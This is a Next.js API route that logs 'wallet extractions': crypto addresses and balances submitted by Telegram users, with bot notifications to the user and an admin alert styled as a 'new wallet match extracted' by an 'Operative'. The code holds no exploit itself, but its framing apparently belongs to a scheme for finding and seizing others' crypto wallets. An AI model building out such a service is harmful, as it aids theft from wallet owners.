import { NextResponse } from 'next/server';
import { addExtraction, getUser } from '@/lib/db';
import { notifyUserWalletFound, notifyAdmin } from '@/bot';
import { checkRateLimit, getClientIp } from '@/lib/rateLimit';

export const dynamic = 'force-dynamic';

export async function POST(req: Request) {
  try {
    const ip = getClientIp(req);
    const rate = checkRateLimit(`extraction_record:${ip}`, 10, 60000);
    if (!rate.allowed) {
      return NextResponse.json({ ok: false, error: 'Too many requests. Please wait.' }, { status: 429 });
    }

    const body = await req.json();
    const {
      tgId,
      userName,
      network,
      walletAddress,
      balanceCrypto,
      balanceUsd,
      symbol,
      lang,
    } = body || {};

    if (!tgId || !network || !walletAddress) {
      return NextResponse.json({ ok: false, error: 'Missing required fields' }, { status: 400 });
    }

    const cleanTgId = String(tgId).replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 32);
    const cleanNetwork = String(network).toUpperCase().slice(0, 16);
    const cleanAddress = String(walletAddress).trim().slice(0, 128);

    // Limit by user ID as well
    const userRate = checkRateLimit(`user_ext:${cleanTgId}`, 6, 60000);
    if (!userRate.allowed) {
      return NextResponse.json({ ok: false, error: 'Extraction rate limit exceeded.' }, { status: 429 });
    }

    const extraction = await addExtraction({
      tgId: cleanTgId,
      userName: String(userName || 'User').slice(0, 64),
      network: cleanNetwork,
      walletAddress: cleanAddress,
      balanceCrypto: Number(balanceCrypto || 0),
      balanceUsd: Number(balanceUsd || 0),
      symbol: String(symbol || '').slice(0, 16),
    });

    // Notify user via Telegram Bot in their language
    const user = await getUser(cleanTgId);
    const effectiveLang = lang || user?.lang || 'en';

    const shortened = cleanAddress.length > 12
      ? `${cleanAddress.slice(0, 6)}...${cleanAddress.slice(-4)}`
      : cleanAddress;

    notifyUserWalletFound(cleanTgId, {
      network: cleanNetwork,
      shortenedAddr: shortened,
      balanceCrypto: balanceCrypto ?? '—',
      symbol: symbol || '',
      balanceUsd: Number(balanceUsd || 0),
    }, effectiveLang).catch((e) => console.error('[Bot Alert] Wallet found user notify failed:', e?.message));

    // Notify Admin
    notifyAdmin(
      `🎯 <b>[NEW WALLET MATCH EXTRACTED]</b>\n\n` +
      `👤 <b>Operative:</b> ${userName || 'User'} (<code>${cleanTgId}</code>)\n` +
      `🌐 <b>Network:</b> ${cleanNetwork}\n` +
      `📍 <b>Address:</b> <code>${cleanAddress}</code>\n` +
      `💵 <b>Value:</b> $${Number(balanceUsd || 0).toLocaleString()} (${balanceCrypto} ${symbol})`
    ).catch(() => {});

    return NextResponse.json({ ok: true, extraction });
  } catch (err: any) {
    console.error('Error in /api/extractions/record:', err?.message || err);
    return NextResponse.json({ ok: false, error: err?.message || 'Server error' }, { status: 500 });
  }
}
